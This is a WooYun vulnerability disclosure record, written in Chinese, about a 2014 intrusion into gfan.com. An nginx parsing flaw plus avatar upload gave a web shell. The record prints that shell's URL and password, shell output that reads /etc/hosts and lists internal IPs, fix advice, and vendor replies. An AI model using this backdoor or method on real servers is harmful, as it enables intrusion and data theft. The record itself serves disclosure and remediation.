{"id": 48229, "wybug_id": "wooyun-2014-083803", "wybug_title": "机锋网多处运维安全隐患导致可上传后门文件一功能性服务器数据安全（getshell）", "wybug_corp": "机锋网", "wybug_author": "我了个去", "wybug_date": "2014-11-19 10:43", "wybug_open_date": "2015-01-03 10:44", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "默认配置不当", "解析漏洞", "服务配置不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-03：\t细节向公众公开  简要描述： 机锋网早已getshell 详细说明：  用户2700W+ 我会乱说嘛过程较简单 ，不详细了，nginx解析，注册用户，上传头像  临时图片位置/.php  getshell   漏洞证明：  由于gfan的业务都是公用的一个存储  nfs共享，而且都对磁盘有写权限，所以直接可以拿到论坛shell一句话地址：http://bbs.gfan.com/data/diy/diy_core.php   密码：wen   不要和我说漏洞已经重复或修补了，此shell证明一切。\n\n\n[/data/bbs/program/data/diy/]$ whoamiwww-data[/data/bbs/program/data/diy/]$ hostnamephp84[/data/bbs/program/data/diy/]$ cat /etc/hosts119.254.88.62 sdk2.entinfo.cn::1     ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters10.8.8.167 api.gfan.com10.8.8.135 bbs.gfan.com117.79.144.130 smtp.gfanstore.com10.8.8.169 source.mappn.com127.0.0.1       localhost112.90.83.87    openapi.qzone.qq.com221.194.129.52    freeapi.hylanda.com112.253.37.235\tdownload006.rdb.cnc.ccgslb.net91.189.91.14   us.archive.ubuntu.com[/data/bbs/program/data/diy/]$ ifconfig -aeth0      Link encap:Ethernet  HWaddr 14:fe:b5:d8:39:0f            inet addr:10.8.8.84  Bcast:10.8.8.255  Mask:255.255.255.0          inet6 addr: fe80::16fe:b5ff:fed8:390f/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:11045431082 errors:0 dropped:0 overruns:0 frame:0          TX packets:9275138430 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:8868587006755 (8.0 TiB)  TX bytes:3115610595957 (2.8 TiB)          Interrupt:36 Memory:d6000000-d6012800 eth1      Link encap:Ethernet  HWaddr 14:fe:b5:d8:39:11            BROADCAST MULTICAST  MTU:1500  Metric:1          RX packets:0 errors:0 dropped:0 overruns:0 frame:0          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)          Interrupt:48 Memory:d8000000-d8012800 eth2      Link encap:Ethernet  HWaddr 14:fe:b5:d8:39:13            BROADCAST MULTICAST  MTU:1500  Metric:1          RX packets:0 errors:0 dropped:0 overruns:0 frame:0          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)          Interrupt:32 Memory:da000000-da012800 eth3      Link encap:Ethernet  HWaddr 14:fe:b5:d8:39:15            BROADCAST MULTICAST  MTU:1500  Metric:1          RX packets:0 errors:0 dropped:0 overruns:0 frame:0          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)          Interrupt:42 Memory:dc000000-dc012800 lo        Link encap:Local Loopback            inet addr:127.0.0.1  Mask:255.0.0.0          inet6 addr: ::1/128 Scope:Host          UP LOOPBACK RUNNING  MTU:16436  Metric:1          RX packets:53635 errors:0 dropped:0 overruns:0 frame:0          TX packets:53635 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:12029502 (11.4 MiB)  TX bytes:12029502 (11.4 MiB)[/data/bbs/program/data/diy/]$ uname -aLinux php84 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux[/data/bbs/program/data/diy/]$\n   修复方案：  修改nginx配置文件，或者升级nginx版本   版权声明：转载请注明来源 我了个去@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-11-19 12:07 厂商回复： 已在修复中，请问nginx哪些指令配置不当。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-19 10:48 |    \t\t我了个去 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:14        | 4892057@qq.com                          ...)\t\t \n  发的仓促，多谢管理帮忙整理格式。    \n     2014-11-19 11:01 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @我了个去 那么着急 :P    \n     2014-11-19 11:06 |    \t\t我了个去 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:14        | 4892057@qq.com                          ...)\t\t \n  @疯狗  :)    \n     2014-11-19 13:06 |    \t\t我了个去 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:14        | 4892057@qq.com                          ...)\t\t \n  刚看了下，nginx解析和nfs共享的问题已经处理了，前一两个月前还存在，不过shell你没有删除干净，仔细检查下吧，至少还有两个，如果找不到加我扣扣 四八九二零五七 详谈    \n     2014-11-19 18:45 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @我了个去 惊呆    \n     2014-11-21 11:54 |    \t\t机锋网(乌云厂商)\t\t \n  @我了个去 已经处理，谢谢。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}